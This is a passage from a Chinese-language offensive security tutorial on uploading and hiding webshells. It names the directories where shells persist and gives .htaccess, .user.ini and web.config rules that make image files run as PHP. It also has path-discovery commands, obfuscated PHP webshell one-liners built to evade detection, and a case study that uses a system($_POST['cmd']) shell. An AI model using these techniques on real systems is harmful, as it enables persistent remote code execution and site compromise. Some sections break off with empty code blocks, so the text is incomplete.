│  4. 临时文件目录         │ ★★★☆☆  │ 高      │ 弱        │ 高           │
│  5. 日志目录             │ ★★☆☆☆  │ 高      │ 弱        │ 高           │
│  6. 缓存目录             │ ★★★☆☆  │ 高      │ 中        │ 高           │
│  7. 备份目录             │ ★★★★☆  │ 中      │ 强        │ 中           │
│  8. 配置文件目录         │ ★★★★★  │ 低      │ 极强      │ 中           │
│  9. 主题/模板目录        │ ★★★★★  │ 低      │ 极强      │ 低           │
│  10. 用户上传根目录      │ ★★★★☆  │ 低      │ 强        │ 低           │
└─────────────────────────────────────────────────────────────────────────┘
```

### 14.2 详细位置分析

#### 14.2.1 富文本编辑器目录

| 编辑器 | 默认路径 | 利用特点 | 持久化 |
|-------|---------|---------|--------|
| **FCKeditor** | `/FCKeditor/UserFiles/` | 文件多,易隐藏 | 高 |
| **CKeditor** | `/ckfinder/userfiles/` | 有connector接口 | 高 |
| **eWebEditor** | `/ewebeditor/uploadfile/` | 老版本漏洞多 | 高 |
| **UEditor** | `/ueditor/php/upload/` | 可上传配置文件 | 高 |
| **KindEditor** | `/kindeditor/attached/` | 可遍历目录 | 中 |
| **TinyMCE** | `/tinymce/uploads/` | 取决于集成方式 | 中 |

**特征识别**:
```bash

#### 14.2.2 用户头像上传位置

**常见路径**:
```
/avatar/uploads/
/user/avatar/
/member/uploadfile/
/data/avatar/
/upload/avatar/
/images/avatars/
/static/avatars/
```

**利用特点**:
- 通常是用户可控目录
- 文件名可预测(userid/username)
- 访问URL容易构造
- 清理机制不完善

**持久化方法**:
```php
// 方法1: 修改自己的头像为webshell
// URL: /avatar/user_123_shell.php
// 优点: 只要账号存在,shell就存在

// 方法2: 上传后利用其他漏洞(如文件包含)
// LFI: /index.php?page=../../avatar/shell.jpg
// 即使是图片,通过LFI也能执行

// 方法3: 竞争条件
// 快速访问删除前的文件,生成新文件在其他位置
```

#### 14.2.3 附件/文档上传位置

**常见路径**:
```
/attachments/
/uploads/
/upload/files/
/data/attachment/
/files/
/download/
```

**业务场景**:
- 邮件附件
- 论坛附件
- 文档分享
- 工单系统
- 投稿系统

**持久化技巧**:
```php
// 1. 伪装成文档
// 文件名: report_2024.php.doc
// 某些系统只检查.doc,不检查中间的.php

// 2. 利用时间命名
// 文件名: 20240123135422.php
// 爆破时间戳访问

// 3. 目录遍历
// 上传到深层目录: /attachments/2024/01/23/

// 4. 修改Content-Disposition
// filename="safe.doc.php" (如果服务器取完整文件名)
```

#### 14.2.6 配置文件目录

**高危位置**:
```
/config/
/application/config/
/.htaccess
/.user.ini
/web.config
```

**利用方法**:
```apache
# .htaccess劫持解析
<FilesMatch "\.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>

# 或重定向
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteRule shell.jpg shell.php [L]
</IfModule>
```

```ini
# .user.ini (PHP-FPM)
auto_prepend_file=/var/www/html/uploads/shell.jpg
# 所有PHP文件执行前自动包含shell.jpg
```

```xml
<!-- web.config (IIS) -->
<configuration>
  <system.webServer>
    <handlers>
      <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule"
           scriptProcessor="C:\php\php-cgi.exe" resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

#### 14.2.7 主题/模板目录

**路径示例**:
```
/wp-content/themes/
/templates/
/application/view/
/skin/frontend/
```

**利用方法**:
```php
// 上传恶意模板文件
// WordPress主题: functions.php
// Joomla模板: index.php
// ThinkPHP模板: index.html (可能被解析)

// 或上传主题zip包,后台安装
```

### 14.3 路径获取技巧

#### 14.3.1 被动获取方法

| 方法 | 原理 | 成功率 |
|-----|------|--------|
| **响应返回** | 上传成功返回路径 | 95% |
| **预览功能** | 图片预览显示路径 | 80% |
| **JS调试** | 查看XHR响应 | 70% |
| **页面源码** | HTML注释/JS变量 | 60% |
| **错误信息** | 报错泄露路径 | 50% |

#### 14.3.2 主动探测方法

```bash
# 1. 目录遍历(FCKeditor)
curl "http://target/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=&CurrentFolder=/"

# 2. 爆破常见路径
gobuster dir -u http://target -w /path/to/wordlist -x .php,.jsp,.asp

# 3. 利用已知的文件命名规则
# 时间戳: /uploads/20240123135422.php
# MD5: /uploads/a3f5e8b9c2d1f4e6.php
# 随机: 爆破6-8位随机字符

# 4. 搜索引擎语法
site:target.com inurl:uploads filetype:php
site:target.com inurl:avatar filetype:jsp
```

### 14.4 Webshell检测与隐藏

#### 14.4.1 检测特征


#### 14.4.2 隐藏技巧

```php
// 1. 变量混淆
$a = 'syste';
$b = 'm';
$ab = $a.$b;
$ab($_POST['x']);

// 2. 回调函数
array_map('ass'.'ert', array($_POST['x']));

// 3. 动态函数
$func = $_REQUEST['f'];
$func($_REQUEST['cmd']);

// 4. 图片马+文件包含
// 上传图片马,利用LFI包含

// 5. 无字母webshell
$_=''; $_[+'']='='; $__='_';
$_=++$_; $_++; $_++; $_++; $_++; $_++; // 6
$__++; $__++; // 2
$___=$_$__; // 6+2=8 (chr)
// 利用数学运算生成字符

// 6. 利用超全局变量
extract($_SERVER['HTTP_HOST']);
// 如果HTTP_HOST包含恶意代码

// 7. 利用异常处理
set_exception_handler('system');
throw new Exception($_POST['cmd']);
```


---

## 15. 综合实战案例分析

### 15.1 案例: wooyun-2015-0127845 完整分析

**漏洞基本信息**:
```json
{
  "bug_id": "wooyun-2015-0127845",
  "title": "某系统文件上传导致任意代码执行",
  "vuln_type": "漏洞类型：文件上传导致任意代码执行",
  "level": "危害等级：高",
  "detail": "上传功能未正确验证文件类型，上传.php文件被执行",
  "poc": "上传shell.php，内容：<?php system($_POST['cmd']); ?>"
}
```

#### 15.1.1 漏洞成因推理

```php
// 推测的有漏洞代码
class UploadController {
    public function upload() {
        $file = $_FILES['file'];

        // 错误1: 可能只检查MIME类型(客户端可控)
        $allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
        if (!in_array($file['type'], $allowed_types)) {
            return ['error' => '文件类型不允许'];
        }

        // 错误2: 未检查文件扩展名,或检查不严格
        // 或只检查了客户端扩展名,未重命名

        // 错误3: 上传目录可执行PHP
        $upload_dir = '/var/www/html/uploads/';
        move_uploaded_file($file['tmp_name'], $upload_dir . $file['name']);

        // 错误4: 返回完整路径(信息泄露)
        return ['url' => 'http://target/uploads/' . $file['name']];
    }
}

// 安全隐患总结:
// 1. MIME类型验证(客户端可控)
// 2. 缺少扩展名白名单验证
// 3. 上传目录有PHP执行权限
// 4. 路径信息泄露
```

#### 15.1.2 漏洞利用步骤
